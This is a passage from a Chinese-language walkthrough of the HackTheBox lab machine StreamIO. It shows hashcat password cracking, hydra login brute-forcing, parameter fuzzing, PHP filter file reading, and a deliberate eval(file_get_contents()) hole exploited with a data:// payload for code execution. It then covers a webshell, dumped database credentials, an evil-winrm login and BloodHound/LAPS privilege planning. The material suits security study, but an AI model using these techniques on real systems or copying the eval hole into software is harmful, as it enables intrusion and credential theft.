<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hashcat userpass /usr/share/wordlists/rockyou.txt --username -m 0 --show &gt; tmp</span><br><span class="line"><span class="built_in">cat</span> tmp |awk -F : <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; cracked_username</span><br><span class="line"><span class="built_in">cat</span> tmp |awk -F : <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> &gt; cracked_password</span><br><span class="line"><span class="built_in">cat</span> tmp |awk -F : -v OFS=<span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print $1,$3&#125;&#x27;</span> &gt; cracked_userpass</span><br></pre></td></tr></table></figure>

<p>因为我们拿到的是STREAMIO的users数据库，可以猜测出这应该可以用于<code>https://streamio.htb</code>的登录。但是随便用了一批账户密码没登进去，那试试爆破一下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="comment"># hydra -C cracked_userpass streamio.htb https-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:Failed&quot;             </span></span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-10 11:35:12</span><br><span class="line">[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries, ~1 try per task</span><br><span class="line">[DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^&amp;password=^PASS^:Failed</span><br><span class="line">[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-10 11:35:14</span><br></pre></td></tr></table></figure>

<p>得到了一对可用的账号密码：<code>yoshihide:66boysandgirls..</code>。接下来登录之后，访问之前爆破出的&#x2F;admin目录：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f55c458853aef54499a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f55c458853aef54499a.jpg"></a></p>
<p>是一个管理员面板。经过观察，发现GET传入的参数不同，会转到不同的页面：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f5fc458853aef545dce.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f5fc458853aef545dce.jpg"></a></p>
<p>但是尝试将这些参数的值改成之前得到的master.php之后，并未得到任何结果。因此可以尝试参数爆破，看看是否存在我们隐藏界面，以下是爆破的结果：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wfuzz -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt -c -u https://streamio.htb/admin/?FUZZ= -H &quot;Cookie: PHPSESSID=puqalerh2km91i9t6p5aa0qggq&quot;  --hw 131</span></span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: https://streamio.htb/admin/?FUZZ=</span></span><br><span class="line"><span class="string">Total requests: 6453</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word       Chars       Payload                                                                                                                   </span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000001575:   200        49 L     137 W      1712 Ch     &quot;debug&quot;                                                                                                                   </span></span><br><span class="line"><span class="string">000003530:   200        10790    25878 W    320235 Ch   &quot;movie&quot;                                                                                                                   </span></span><br><span class="line"><span class="string">                        L                                                                                                                                                         </span></span><br><span class="line"><span class="string">000005450:   200        398 L    916 W      12484 Ch    &quot;staff&quot;                                                                                                                   </span></span><br><span class="line"><span class="string">000006133:   200        62 L     160 W      2073 Ch     &quot;user&quot;                                                                                                                    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Total time: 76.33917</span></span><br><span class="line"><span class="string">Processed Requests: 6453</span></span><br><span class="line"><span class="string">Filtered Requests: 6449</span></span><br><span class="line"><span class="string">Requests/sec.: 84.53064</span></span><br></pre></td></tr></table></figure>

<p>可以看到，还存在一个debug参数，我们访问之后，结果如下：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f6bc458853aef547ee9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f6bc458853aef547ee9.jpg"></a></p>
<p>可以看到，这里提示我们此选项仅供开发者使用。我们将debug的值设为master.php之后，发现又出现了movie、staff以及user的管理界面的详情。尝试php伪协议读一下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://streamio.htb/admin/?debug=php://filter/read=convert.base64-encode/resource=master.php</span><br></pre></td></tr></table></figure>

<p>将得到的结果base64解码后，得到master.php的源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;Movie managment&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;included&#x27;</span>))</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;Only accessable through includes&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;movie_id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;delete from movies where id = &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;movie_id&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$handle</span>, <span class="variable">$query</span>, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">&quot;Scrollable&quot;</span>=&gt;<span class="string">&quot;buffered&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from movies order by movie&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$handle</span>, <span class="variable">$query</span>, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">&quot;Scrollable&quot;</span>=&gt;<span class="string">&quot;buffered&quot;</span>));</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">sqlsrv_fetch_array</span>(<span class="variable">$res</span>, SQLSRV_FETCH_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>: 3<span class="title">rem</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">h4</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">left</span>;&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">movie</span>&#x27;]; ?&gt;&lt;/<span class="title">h4</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">div</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">right</span>;<span class="title">padding</span>-<span class="title">right</span>: 25<span class="title">px</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">action</span>=&quot;?<span class="title">movie</span>=&quot;&gt;</span></span><br><span class="line"><span class="class">				&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">hidden</span>&quot; <span class="title">name</span>=&quot;<span class="title">movie_id</span>&quot; <span class="title">value</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">id</span>&#x27;]; ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">				&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">sm</span> <span class="title">btn</span>-<span class="title">primary</span>&quot; <span class="title">value</span>=&quot;<span class="title">Delete</span>&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125; # <span class="title">while</span> <span class="title">end</span></span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">br</span>&gt;&lt;<span class="title">hr</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h1</span>&gt;<span class="title">Staff</span> <span class="title">managment</span>&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">if</span>(!<span class="title">defined</span>(&#x27;<span class="title">included</span>&#x27;))</span></span><br><span class="line"><span class="class">	<span class="title">die</span>(&quot;<span class="title">Only</span> <span class="title">accessable</span> <span class="title">through</span> <span class="title">includes</span>&quot;);</span></span><br><span class="line"><span class="class">$<span class="title">query</span> = &quot;<span class="title">select</span> * <span class="title">from</span> <span class="title">users</span> <span class="title">where</span> <span class="title">is_staff</span> = 1 &quot;;</span></span><br><span class="line"><span class="class">$<span class="title">res</span> = <span class="title">sqlsrv_query</span>($<span class="title">handle</span>, $<span class="title">query</span>, <span class="title">array</span>(), <span class="title">array</span>(&quot;<span class="title">Scrollable</span>&quot;=&gt;&quot;<span class="title">buffered</span>&quot;));</span></span><br><span class="line"><span class="class"><span class="title">if</span>(<span class="title">isset</span>($<span class="title">_POST</span>[&#x27;<span class="title">staff_id</span>&#x27;]))</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">alert</span> <span class="title">alert</span>-<span class="title">success</span>&quot;&gt; <span class="title">Message</span> <span class="title">sent</span> <span class="title">to</span> <span class="title">administrator</span>&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">$<span class="title">query</span> = &quot;<span class="title">select</span> * <span class="title">from</span> <span class="title">users</span> <span class="title">where</span> <span class="title">is_staff</span> = 1&quot;;</span></span><br><span class="line"><span class="class">$<span class="title">res</span> = <span class="title">sqlsrv_query</span>($<span class="title">handle</span>, $<span class="title">query</span>, <span class="title">array</span>(), <span class="title">array</span>(&quot;<span class="title">Scrollable</span>&quot;=&gt;&quot;<span class="title">buffered</span>&quot;));</span></span><br><span class="line"><span class="class"><span class="title">while</span>($<span class="title">row</span> = <span class="title">sqlsrv_fetch_array</span>($<span class="title">res</span>, <span class="title">SQLSRV_FETCH_ASSOC</span>))</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>: 3<span class="title">rem</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">h4</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">left</span>;&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">username</span>&#x27;]; ?&gt;&lt;/<span class="title">h4</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">div</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">right</span>;<span class="title">padding</span>-<span class="title">right</span>: 25<span class="title">px</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">				&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">hidden</span>&quot; <span class="title">name</span>=&quot;<span class="title">staff_id</span>&quot; <span class="title">value</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">id</span>&#x27;]; ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">				&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">sm</span> <span class="title">btn</span>-<span class="title">primary</span>&quot; <span class="title">value</span>=&quot;<span class="title">Delete</span>&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125; # <span class="title">while</span> <span class="title">end</span></span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">br</span>&gt;&lt;<span class="title">hr</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h1</span>&gt;<span class="title">User</span> <span class="title">managment</span>&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">if</span>(!<span class="title">defined</span>(&#x27;<span class="title">included</span>&#x27;))</span></span><br><span class="line"><span class="class">	<span class="title">die</span>(&quot;<span class="title">Only</span> <span class="title">accessable</span> <span class="title">through</span> <span class="title">includes</span>&quot;);</span></span><br><span class="line"><span class="class"><span class="title">if</span>(<span class="title">isset</span>($<span class="title">_POST</span>[&#x27;<span class="title">user_id</span>&#x27;]))</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;delete from users where is_staff = 0 and id = &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$handle</span>, <span class="variable">$query</span>, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">&quot;Scrollable&quot;</span>=&gt;<span class="string">&quot;buffered&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from users where is_staff = 0&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$handle</span>, <span class="variable">$query</span>, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">&quot;Scrollable&quot;</span>=&gt;<span class="string">&quot;buffered&quot;</span>));</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">sqlsrv_fetch_array</span>(<span class="variable">$res</span>, SQLSRV_FETCH_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>: 3<span class="title">rem</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">h4</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">left</span>;&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">username</span>&#x27;]; ?&gt;&lt;/<span class="title">h4</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">div</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">right</span>;<span class="title">padding</span>-<span class="title">right</span>: 25<span class="title">px</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">				&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">hidden</span>&quot; <span class="title">name</span>=&quot;<span class="title">user_id</span>&quot; <span class="title">value</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">id</span>&#x27;]; ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">				&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">sm</span> <span class="title">btn</span>-<span class="title">primary</span>&quot; <span class="title">value</span>=&quot;<span class="title">Delete</span>&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125; # <span class="title">while</span> <span class="title">end</span></span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">br</span>&gt;&lt;<span class="title">hr</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">include</span>&quot; <span class="title">hidden</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">if</span>(<span class="title">isset</span>($<span class="title">_POST</span>[&#x27;<span class="title">include</span>&#x27;]))</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>] !== <span class="string">&quot;index.php&quot;</span> ) </span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>]));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot; ---- ERROR ---- &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意看最下面这部分php代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>] !== <span class="string">&quot;index.php&quot;</span> ) </span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>]));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot; ---- ERROR ---- &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>假设我们传入的include参数是<code>data://text/plain,phpinfo();</code>，那么经过<code>file_get_contents()</code>函数的处理再传给eval函数，不就直接执行了phpinfo()了吗？我们试一下：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f77c458853aef549a27.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f77c458853aef549a27.jpg"></a></p>
<p>果不其然，出现了phpinfo。那接下来更改<code>phpinfo();</code>为<code>system(&#39;command&#39;)</code>即可执行任意命令。我这里是上传了一个webshell，然后利用蚁剑连接。当前用户是<code>yoshihide</code>且没有家目录，仅用于Web应用操作。之后审计了一下代码，得到了两对mssql的账号密码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#C:/inetpub/streamio.htb/admin/index.php</span></span><br><span class="line"><span class="variable">$connection</span> = <span class="keyword">array</span>(<span class="string">&quot;Database&quot;</span>=&gt;<span class="string">&quot;STREAMIO&quot;</span>, <span class="string">&quot;UID&quot;</span> =&gt; <span class="string">&quot;db_admin&quot;</span>, <span class="string">&quot;PWD&quot;</span> =&gt; <span class="string">&#x27;B1@hx31234567890&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#C:/inetpub/watch.streamio.htb/search.php</span></span><br><span class="line"><span class="variable">$connection</span> = <span class="keyword">array</span>(<span class="string">&quot;Database&quot;</span>=&gt;<span class="string">&quot;STREAMIO&quot;</span>, <span class="string">&quot;UID&quot;</span> =&gt; <span class="string">&quot;db_user&quot;</span>, <span class="string">&quot;PWD&quot;</span> =&gt; <span class="string">&#x27;B1@hB1@hB1@h&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>利用蚁剑的数据操作的功能，可以直接连接到mssql（也可以实验sqlcmd连接，执行where.exe sqlcmd即可找到sqlcmd的位置），查看streamio_backup表中的数据：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f82c458853aef54abf6.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f82c458853aef54abf6.jpg"></a></p>
<p>可以看到有一条username为nikk37的数据，利用蚁剑的导出功能导出结果，得到了一个csv文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> 10.10.11.158_20231210123309.csv </span><br><span class="line"><span class="built_in">id</span>,username,password</span><br><span class="line">8,Sabrina,f87d3c0d6c8fd686aacc6627f1f493a5</span><br><span class="line">7,William,d62be0dc82071bccc1322d64ec5b6c51</span><br><span class="line">6,Lauren,08344b85b329d7efd611b7a7743e8a09</span><br><span class="line">5,Samantha,083ffae904143c4796e464dac33c1f7d</span><br><span class="line">4,Theodore,925e5408ecb67aea449373d668b7359e</span><br><span class="line">3,James,c660060492d9edcaa8332d89c99c9239</span><br><span class="line">2,yoshihide,b779ba15cedfd22a023c4d8bcf5f2332</span><br><span class="line">1,nikk37,389d14cb8e4e9b94b137deb1caf0612a</span><br></pre></td></tr></table></figure>

<p>依然对数据进行处理，并爆破密码，结果如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hashcat account /usr/share/wordlists/rockyou.txt --username -m 0 --show </span></span><br><span class="line">Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$</span><br><span class="line">Lauren:08344b85b329d7efd611b7a7743e8a09:<span class="comment">##123a8j8w5123##</span></span><br><span class="line">yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..</span><br><span class="line">nikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com</span><br></pre></td></tr></table></figure>

<p>尝试利用evil-winrm和<code>nikk37:get_dem_girls2@yahoo.com</code>进行登录，成功登录：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f8cc458853aef54bf54.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f8cc458853aef54bf54.jpg"></a></p>
<h2 id="GetAdministrator"><a href="#GetAdministrator" class="headerlink" title="GetAdministrator"></a>GetAdministrator</h2><p>首先上传一个SharpHound.exe进行信息收集：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f99c458853aef54d8a9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f99c458853aef54d8a9.jpg"></a></p>
<p>接着下载生成的zip文件并导入到BloodHound：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760fa4c458853aef54eeaa.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fa4c458853aef54eeaa.jpg"></a></p>
<p>图中所指的用户为jdgodd，所指的组为core staff。可以看到jdgodd对core staff有writeowner的权限，而core staff的组成员可以读取LAPS的密码。我们可以看到core staff组中是没有成员的：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760fb7c458853aef550a56.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fb7c458853aef550a56.jpg"></a></p>
<p>因此我们此时的思路是拿到jdgodd的密码然后登录到DC，之后将jdgodd或者nikk37添加到core staff组中，最后dump LAPS密码。那首先进行我们的第一步，找到jdgodd密码。上传一个Winpeas运行一下，看看能不能找到线索：</p>
